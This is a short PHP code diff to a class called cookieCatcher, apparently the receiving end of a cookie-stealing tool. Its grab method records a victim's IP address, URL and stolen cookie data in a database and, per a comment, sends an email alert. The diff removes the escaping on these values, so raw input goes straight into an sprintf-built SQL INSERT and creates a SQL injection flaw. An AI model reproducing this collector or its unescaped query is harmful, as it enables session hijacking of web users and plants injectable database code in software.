@@ -16,9 +16,9 @@ class cookieCatcher extends mysqlQueryLab {
   public function grab($ip,$url,$cookie)
   {
     $query = sprintf("INSERT INTO cookies(ip,url,cookiedata) VALUES('%s','%s','%s')",
-                mysql_real_escape_string($ip),
-                mysql_real_escape_string($url),
-                mysql_real_escape_string($cookie));
+                $ip,
+                $url,
+                $cookie);
     $cookie = $this->execute($query);
     
     // Send email notification
